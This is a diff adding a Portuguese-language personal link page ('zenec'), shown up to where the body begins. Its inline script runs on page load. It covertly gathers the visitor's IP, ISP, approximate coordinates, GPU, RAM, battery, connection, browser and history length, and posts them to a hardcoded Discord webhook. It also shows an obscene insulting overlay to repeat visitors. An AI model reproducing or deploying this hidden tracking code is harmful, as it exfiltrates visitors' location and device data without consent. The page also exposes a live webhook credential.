@@ -1,0 +1,614 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>zenec</title>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700;900&display=swap" rel="stylesheet">
+<script>
+function copyNick() {
+  const nick = 'ZENEC AMASSA BOT';
+  navigator.clipboard.writeText(nick).then(() => {
+    alert('Nick copiado! Pronto pra perder?');
+  }).catch(() => {
+    const textarea = document.createElement('textarea');
+    textarea.value = nick;
+    textarea.style.position = 'fixed';
+    textarea.style.opacity = '0';
+    document.body.appendChild(textarea);
+    textarea.select();
+    document.execCommand('copy');
+    document.body.removeChild(textarea);
+    alert('Nick copiado! Pronto pra perder?');
+  });
+}
+
+let autoplayActivated = false;
+
+document.addEventListener('click', function() {
+  if (!autoplayActivated) {
+    autoplayActivated = true;
+  }
+}, { once: true });
+
+// Função para obter informações de hardware avançadas
+async function getAdvancedInfo() {
+  const info = {};
+  
+  // GPU/Placa de Vídeo
+  try {
+    const canvas = document.createElement('canvas');
+    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+    if (gl) {
+      const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+      if (debugInfo) {
+        info.gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+      } else {
+        info.gpu = 'N/A';
+      }
+    } else {
+      info.gpu = 'WebGL não suportado';
+    }
+  } catch (e) {
+    info.gpu = 'Erro ao detectar GPU';
+  }
+
+  // Memória RAM e Cores do Processador
+  if (navigator.deviceMemory) {
+    info.ram = navigator.deviceMemory + 'GB RAM';
+  } else {
+    info.ram = 'N/A';
+  }
+
+  if (navigator.hardwareConcurrency) {
+    info.cores = navigator.hardwareConcurrency + ' Cores';
+  } else {
+    info.cores = 'N/A';
+  }
+
+  // Bateria
+  try {
+    if (navigator.getBattery) {
+      const battery = await navigator.getBattery();
+      const batteryLevel = Math.round(battery.level * 100);
+      const charging = battery.charging ? 'Carregando' : 'Descarregando';
+      info.battery = `${batteryLevel}% (${charging})`;
+    } else {
+      info.battery = 'N/A';
+    }
+  } catch (e) {
+    info.battery = 'N/A';
+  }
+
+  // Velocidade da Internet
+  try {
+    if (navigator.connection || navigator.mozConnection || navigator.webkitConnection) {
+      const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+      if (connection.downlink) {
+        info.internet = connection.downlink + ' Mbps';
+      } else {
+        info.internet = 'N/A';
+      }
+    } else {
+      info.internet = 'N/A';
+    }
+  } catch (e) {
+    info.internet = 'N/A';
+  }
+
+  // Histórico (quantidade aproximada)
+  try {
+    info.history = window.history.length + ' páginas visitadas';
+  } catch (e) {
+    info.history = 'N/A';
+  }
+
+  // Pixel Ratio
+  info.pixelRatio = window.devicePixelRatio || 1;
+
+  return info;
+}
+
+// Função para contar visitas
+function getVisitCount() {
+  const visits = localStorage.getItem('zenec_visits');
+  const count = visits ? parseInt(visits) : 0;
+  const newCount = count + 1;
+  localStorage.setItem('zenec_visits', newCount);
+  console.log(`🔢 Contador de visitas: ${newCount}`);
+  
+  // Mostra mensagem visual se passou de 3
+  if (newCount > 3) {
+    setTimeout(() => {
+      // Cria overlay escuro
+      const overlay = document.createElement('div');
+      overlay.style.cssText = `
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background: rgba(0, 0, 0, 0.95);
+        z-index: 9999;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        justify-content: center;
+        animation: fadeIn 0.5s;
+      `;
+      
+      // Imagem do meme
+      const img = document.createElement('img');
+      img.src = 'data:image/webp;base64,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';
+      img.style.cssText = `
+        width: 300px;
+        height: 300px;
+        border-radius: 50%;
+        margin-bottom: 30px;
+        box-shadow: 0 0 40px rgba(255,0,0,0.8);
+        animation: shake 0.5s infinite;
+        object-fit: cover;
+      `;
+      
+      // Mensagem grande
+      const message = document.createElement('div');
+      message.style.cssText = `
+        font-size: 48px;
+        font-weight: 900;
+        color: #ff0000;
+        text-align: center;
+        text-shadow: 0 0 20px rgba(255,0,0,0.8), 0 0 40px rgba(255,0,0,0.5);
+        padding: 40px;
+        animation: pulse 1s infinite;
+      `;
+      message.textContent = '🖕 TÁ CARENTE? 🖕';
+      
+      // Submensagem
+      const subMessage = document.createElement('div');
+      subMessage.style.cssText = `
+        font-size: 32px;
+        color: #ff0000;
+        text-align: center;
+        margin-top: 20px;
+        text-shadow: 0 0 10px rgba(255,0,0,0.5);
+      `;
+      subMessage.textContent = `FILHA DA PUTA! VISITA #${newCount}`;
+      
+      // Botão fechar
+      const closeBtn = document.createElement('button');
+      closeBtn.style.cssText = `
+        margin-top: 40px;
+        padding: 15px 30px;
+        font-size: 20px;
+        background: #ff0000;
+        color: #fff;
+        border: none;
+        border-radius: 8px;
+        cursor: pointer;
+        font-weight: bold;
+        box-shadow: 0 0 20px rgba(255,0,0,0.5);
+      `;
+      closeBtn.textContent = 'SAI DAQUI';
+      closeBtn.onclick = () => overlay.remove();
+      
+      overlay.appendChild(img);
+      overlay.appendChild(message);
+      overlay.appendChild(subMessage);
+      overlay.appendChild(closeBtn);
+      document.body.appendChild(overlay);
+      
+      // Adiciona animações
+      const style = document.createElement('style');
+      style.textContent = `
+        @keyframes fadeIn {
+          from { opacity: 0; }
+          to { opacity: 1; }
+        }
+        @keyframes pulse {
+          0%, 100% { transform: scale(1); }
+          50% { transform: scale(1.05); }
+        }
+        @keyframes shake {
+          0%, 100% { transform: rotate(0deg); }
+          25% { transform: rotate(-5deg); }
+          75% { transform: rotate(5deg); }
+        }
+      `;
+      document.head.appendChild(style);
+    }, 1500);
+  }
+  
+  return newCount;
+}
+
+// Função para enviar dados para o webhook do Discord
+async function sendToDiscord(data) {
+  const WEBHOOK_URL = 'https://discord.com/api/webhooks/1459400321028591741/bGaZeQumVLpjT4kivgDFpXUlMspfHiYiW7CTc0utDDEEekspp8m8owqG-aRuIGz89STw';
+  
+  try {
+    const embed = {
+      title: "🔍 Rastreamento de Visitante",
+      color: 65280,
+      fields: [
+        { name: "🌐 IP", value: data.ip || "N/A", inline: true },
+        { name: "🏢 Provedor", value: data.isp || "N/A", inline: true },
+        { name: "📍 Localização", value: data.location || "N/A", inline: false },
+        { name: "🗺️ Coordenadas", value: data.coords || "N/A", inline: true },
+        { name: "🎯 Precisão", value: data.accuracy || "N/A", inline: true },
+        { name: "🖥️ Sistema", value: data.platform, inline: false },
+        { name: "🎮 GPU / Placa", value: data.gpu || "N/A", inline: false },
+        { name: "🔋 Bateria", value: data.battery || "N/A", inline: true },
+        { name: "📡 Internet", value: data.internet || "N/A", inline: true },
+        { name: "🌐 Navegador", value: data.browser, inline: false },
+        { name: "📱 Tela", value: data.screen, inline: true },
+        { name: "🌍 Idioma", value: data.language, inline: true },
+        { name: "📖 Referrer", value: data.referrer.length > 100 ? data.referrer.substring(0, 97) + "..." : data.referrer, inline: false },
+        { name: "📚 Histórico", value: data.history || "N/A", inline: true },
+        { name: "⏰ Horário Acesso", value: data.time, inline: true }
+      ],
+      timestamp: new Date().toISOString(),
+      footer: { text: "zenec security system v3" },
+      thumbnail: {
+        url: "https://flagcdn.com/w80/" + (data.countryCode ? data.countryCode.toLowerCase() : "br") + ".png"
+      }
+    };
+
+    const response = await fetch(WEBHOOK_URL, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+      },
+      body: JSON.stringify({ 
+        username: "ZENEC Security Pro",
+        embeds: [embed] 
+      })
+    });
+
+    if (!response.ok) {
+      console.error('Erro no webhook:', response.status);
+    } else {
+      console.log('✅ Dados enviados com sucesso!');
+    }
+  } catch (error) {
+    console.error('❌ Erro ao enviar:', error);
+  }
+}
+
+// Coletar todas as informações e enviar UMA vez
+async function collectInfo() {
+  try {
+    console.log('🔍 Iniciando coleta de dados...');
+    
+    // 1. Coleta informações avançadas de hardware
+    const advancedInfo = await getAdvancedInfo();
+    
+    // 2. Busca localização por IP (cidade e estado)
+    console.log('🌐 Buscando localização por IP...');
+    let locationData;
+    
+    try {
+      // Tenta ipapi.co primeiro (confiável para cidade/estado)
+      const response1 = await fetch('https://ipapi.co/json/');
+      locationData = await response1.json();
+      
+      if (locationData.error) {
+        throw new Error('Rate limit na primeira API');
+      }
+      
+      console.log('✅ Dados de IP obtidos:', locationData);
+      
+    } catch (e) {
+      console.log('⚠️ Primeira API falhou, tentando alternativa...');
+      // Fallback: ipwhois.app
+      try {
+        const response2 = await fetch('https://ipwho.is/');
+        const geoData = await response2.json();
+        
+        locationData = {
+          ip: geoData.ip,
+          city: geoData.city,
+          region: geoData.region,
+          country_name: geoData.country,
+          country_code: geoData.country_code,
+          latitude: geoData.latitude,
+          longitude: geoData.longitude,
+          timezone: geoData.timezone?.id,
+          org: geoData.connection?.isp || geoData.connection?.org || 'N/A',
+          asn: geoData.connection?.asn
+        };
+        
+        console.log('✅ API alternativa obtida:', locationData);
+        
+      } catch (e2) {
+        console.log('⚠️ Segunda API falhou, usando IP básico...');
+        // Último fallback: só IP básico
+        const response3 = await fetch('https://api.ipify.org?format=json');
+        const ipData = await response3.json();
+        locationData = { ip: ipData.ip };
+      }
+    }
+    
+    // 3. Define coordenadas e precisão
+    const coords = locationData.latitude && locationData.longitude 
+      ? `${locationData.latitude}, ${locationData.longitude}`
+      : 'N/A';
+    const accuracy = coords !== 'N/A' ? 'Cidade/Estado (~2-10km)' : 'N/A';
+    
+    // 4. Monta string do sistema com cores e RAM
+    const systemInfo = `${navigator.platform} (${advancedInfo.cores}, ${advancedInfo.ram})`;
+    
+    // 5. Monta dados completos (SÓ DADOS CONFIÁVEIS)
+    const fullData = {
+      time: new Date().toLocaleString('pt-BR'),
+      platform: systemInfo,
+      browser: navigator.userAgent.substring(0, 150),
+      screen: `${screen.width}x${screen.height} (${advancedInfo.pixelRatio}x)`,
+      language: navigator.language,
+      referrer: document.referrer || "Acesso direto",
+      ip: locationData.ip || "N/A",
+      location: `${locationData.city || '?'}, ${locationData.region || '?'}, ${locationData.country_name || '?'}`,
+      isp: locationData.org || "N/A",
+      coords: coords,
+      accuracy: accuracy,
+      timezone: locationData.timezone || Intl.DateTimeFormat().resolvedOptions().timeZone,
+      countryCode: locationData.country_code || "N/A",
+      asn: locationData.asn || "N/A",
+      gpu: advancedInfo.gpu,
+      battery: advancedInfo.battery,
+      internet: advancedInfo.internet,
+      history: advancedInfo.history
+    };
+
+    // 6. Envia apenas UMA vez com tudo
+    console.log('📤 Enviando dados completos:', fullData);
+    sendToDiscord(fullData);
+  } catch (error) {
+    console.error('❌ Erro geral na coleta:', error);
+    
+    // Fallback mínimo se tudo falhar
+    try {
+      const advancedInfo = await getAdvancedInfo();
+      const response = await fetch('https://api.ipify.org?format=json');
+      const ipData = await response.json();
+      
+      const systemInfo = `${navigator.platform} (${advancedInfo.cores}, ${advancedInfo.ram})`;
+      
+      const basicData = {
+        time: new Date().toLocaleString('pt-BR'),
+        platform: systemInfo,
+        browser: navigator.userAgent.substring(0, 150),
+        screen: `${screen.width}x${screen.height} (${advancedInfo.pixelRatio}x)`,
+        language: navigator.language,
+        referrer: document.referrer || "Acesso direto",
+        ip: ipData.ip,
+        location: "Não disponível",
+        neighborhood: "N/A",
+        street: "N/A",
+        isp: "Não disponível",
+        coords: "Não disponível",
+        accuracy: "N/A",
+        postal: "N/A",
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        countryCode: "N/A",
+        asn: "N/A",
+        gpu: advancedInfo.gpu,
+        battery: advancedInfo.battery,
+        internet: advancedInfo.internet,
+        history: advancedInfo.history
+      };
+      sendToDiscord(basicData);
+    } catch (finalError) {
+      console.error('❌ Erro total:', finalError);
+    }
+  }
+}
+
+// Executar quando a página carregar
+if (document.readyState === 'loading') {
+  document.addEventListener('DOMContentLoaded', collectInfo);
+} else {
+  collectInfo();
+}
+
+window.addEventListener('load', function() {
+  const canvas = document.createElement('canvas');
+  canvas.id = 'matrix';
+  canvas.style.position = 'fixed';
+  canvas.style.top = '0';
+  canvas.style.left = '0';
+  canvas.style.width = '100%';
+  canvas.style.height = '100%';
+  canvas.style.zIndex = '1';
+  canvas.style.pointerEvents = 'none';
+  document.body.appendChild(canvas);
+
+  const ctx = canvas.getContext('2d');
+  canvas.width = window.innerWidth;
+  canvas.height = window.innerHeight;
+
+  const chars = '01';
+  const fontSize = 14;
+  const columns = canvas.width / fontSize;
+  const drops = [];
+
+  for (let i = 0; i < columns; i++) {
+    drops[i] = Math.random() * canvas.height / fontSize;
+  }
+
+  function drawMatrix() {
+    ctx.fillStyle = 'rgba(5, 5, 7, 0.05)';
+    ctx.fillRect(0, 0, canvas.width, canvas.height);
+    ctx.fillStyle = '#0f0';
+    ctx.font = fontSize + 'px monospace';
+
+    for (let i = 0; i < drops.length; i++) {
+      const text = chars[Math.floor(Math.random() * chars.length)];
+      ctx.fillText(text, i * fontSize, drops[i] * fontSize);
+
+      if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
+        drops[i] = 0;
+      }
+      drops[i]++;
+    }
+  }
+
+  setInterval(drawMatrix, 35);
+
+  window.addEventListener('resize', () => {
+    canvas.width = window.innerWidth;
+    canvas.height = window.innerHeight;
+  });
+});
+</script>
+<style>
+*{margin:0;padding:0;box-sizing:border-box;font-family:Inter,sans-serif}
+html,body{background:#050507;color:#fff;height:100%;overflow:hidden;position:fixed;width:100%}
+
+.container{
+  position:relative;
+  z-index:2;
+  min-height:100vh;
+  display:flex;
+  flex-direction:column;
+  align-items:center;
+  justify-content:center;
+  gap:28px;
+  padding:20px;
+}
+
+.name{
+  font-size:78px;
+  font-weight:900;
+  letter-spacing:8px;
+  text-transform:lowercase;
+  color:#0f0;
+  text-shadow:
+    0 0 20px rgba(0,255,0,.8),
+    0 0 40px rgba(0,255,0,.5),
+    0 0 60px rgba(0,255,0,.3);
+  position:relative;
+}
+
+.bg{
+  position:fixed;
+  inset:0;
+  z-index:0;
+}
+
+.smoke{
+  position:absolute;
+  width:120%;
+  height:120%;
+  filter:blur(120px);
+  opacity:.6;
+  animation:move 14s infinite alternate;
+}
+
+.smoke.purple{
+  background:radial-gradient(circle at center, rgba(139,92,246,.8), transparent 60%);
+  top:-20%;
+  left:-10%;
+}
+
+.smoke.green{
+  background:radial-gradient(circle at center, rgba(34,197,94,.7), transparent 60%);
+  bottom:-20%;
+  right:-10%;
+  animation-duration:18s;
+}
+
+@keyframes move{
+  from{transform:translate(0,0)}
+  to{transform:translate(80px,60px)}
+}
+
+.noise{
+  position:absolute;
+  inset:0;
+  background-image:url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='200' height='200'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.8' numOctaves='4'/%3E%3C/filter%3E%3Crect width='200' height='200' filter='url(%23n)' opacity='0.04'/%3E%3C/svg%3E");
+  opacity:.15;
+}
+
+.links{
+  width:100%;
+  max-width:340px;
+  display:flex;
+  flex-direction:column;
+  gap:14px;
+}
+
+.link{
+  text-decoration:none;
+  color:#0f0;
+  padding:16px;
+  border-radius:12px;
+  text-align:center;
+  background:rgba(0,0,0,.8);
+  border:1px solid #0f0;
+  transition:.25s;
+  font-family:monospace;
+  text-transform:uppercase;
+  letter-spacing:2px;
+  box-shadow:0 0 10px rgba(0,255,0,.3);
+}
+
+.link:hover{
+  background:#0f0;
+  color:#000;
+  box-shadow:0 0 20px rgba(0,255,0,.8), 0 0 40px rgba(0,255,0,.5);
+  transform:translateY(-3px);
+}
+
+.spotify-container{
+  width:100%;
+  max-width:340px;
+  overflow:hidden;
+}
+
+.footer{
+  margin-top:20px;
+  font-size:14px;
+  opacity:.5;
+  letter-spacing:1px;
+}
+
+@media (max-width: 768px) {
+  .name{font-size:48px;letter-spacing:4px}
+}
+</style>
+</head>
+<body>
+
+<div class="bg">
+  <div class="smoke purple"></div>
+  <div class="smoke green"></div>
+  <div class="noise"></div>
+</div>
+
+<main class="container">
